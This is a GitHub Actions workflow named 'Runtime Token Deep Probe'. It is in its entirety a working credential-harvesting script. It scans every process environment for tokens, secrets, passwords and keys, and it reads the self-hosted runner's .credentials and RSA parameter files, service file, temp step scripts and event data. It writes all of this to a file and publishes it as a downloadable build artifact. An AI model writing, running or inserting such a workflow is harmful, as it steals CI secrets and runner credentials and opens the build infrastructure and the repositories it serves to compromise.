name: Runtime Token Deep Probe
on:
  workflow_dispatch:

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Deep token hunt
        run: |
          set +e
          exec 3>&1 1>/tmp/probe4_output.txt 2>&1
          echo "=== Search ALL process environ ==="
          for pid in $(ps -eo pid= 2>/dev/null); do
            env_file="/proc/$pid/environ"
            if [ -r "$env_file" ]; then
              full_env=$(cat "$env_file" 2>/dev/null | tr '\0' '\n')
              found=$(echo "$full_env" | grep -iE 'RUNTIME|TOKEN|SECRET|CREDENTIAL|_PASSWORD|_KEY')
              if [ -n "$found" ]; then
                echo "--- PID $pid ($(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')) ---"
                echo "$found"
              fi
            fi
          done
          echo "=== Runner config files ==="
          ls -la /home/runner/actions-runner/ 2>&1 || echo "no runner dir"
          cat /home/runner/actions-runner/.runner 2>&1
          cat /home/runner/actions-runner/.credentials 2>&1
          cat /home/runner/actions-runner/.credentials_rsaparams 2>&1
          echo "=== Runner service file ==="
          find /etc/systemd -name "*actions*" -o -name "*runner*" 2>/dev/null | head -5
          cat /etc/systemd/system/actions.runner.*.service 2>&1
          echo "=== Shell script for this step ==="
          cat /home/runner/work/_temp/*.sh 2>&1
          echo "=== Event file secrets ==="
          python3 -c "
import json
with open('/home/runner/work/_temp/_github_workflow/event.json') as f:
    data = json.load(f)
print(json.dumps(data.get('repository', {}), indent=2))
" 2>&1

      - uses: actions/upload-artifact@v4
        with:
          name: probe4-results
          path: /tmp/probe4_output.txt
